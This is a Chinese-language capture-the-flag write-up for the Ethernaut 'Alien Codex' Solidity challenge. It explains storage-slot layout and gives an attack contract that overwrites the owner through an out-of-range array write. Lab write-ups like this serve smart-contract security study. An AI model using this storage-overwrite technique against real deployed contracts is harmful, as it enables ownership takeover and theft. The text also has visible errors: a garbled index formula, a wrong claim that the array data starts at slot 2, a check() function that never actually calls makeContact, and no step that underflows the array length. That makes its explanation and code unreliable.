# Ethernaut-Alien-Codex
Ethernaut Alien Codex解題思路

<img width="582" height="560" alt="image" src="https://github.com/user-attachments/assets/4d05b21a-cf12-419a-a5c6-550eeb7bcf22" />

***這題是在解釋動態記憶體的排列方式***

我們可以看到AlienCodex合約裡面有兩個變數分別是靜態變數bool public contact，另一個則是動態變數bytes32[] public codex。

故原本:

slot[0]:contact（後面會解釋為什麼會變成owner

slot[1]：codex陣列的起始位置

slot[2~....]：codex陣列裡面的內容

在這之前先必須了解要怎麼算想要的位置

舉例：

如果陣列有100格，且陣從50開始那就代表陣列的第i格會是(50+1)%100的餘數

因為我們這一題是要改onwer，且因為合約繼承Ownable所以父合約的第一個變數會佔據slot[0]，故儲存的就會變成合約Ownable的owner，

uint256 base=uint256(keccak256(abi.encodePacked(uint256(1)));是用keccak256來計算codex在起始位置是多少

uint256 index=type(uint256).max-base+1;就會套用到剛剛的公式移項之後的結果，這邊我是取uint256的最大值減掉base加上1就可以知道slto[0]到底是多少了

最後把index帶進target.revise(index,bytes32(uint256(uint160(msg.sender))));就可以改變owner了

以下為攻擊合約程式碼：

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface IAlienCodex {
    function revise(uint256 i, bytes32 _content) external ;
    function makeContact() external; 
    }

    contract hack {
    IAlienCodex public target;
    constructor(address _target){
        target=IAlienCodex(_target);
    }
    function check() public view{
        target.makeContact;
    }
    function getOwner() public {
        uint256 base=uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 index=type(uint256).max-base+1;
        target.revise(index,bytes32(uint256(uint160(msg.sender))));
    }
    }
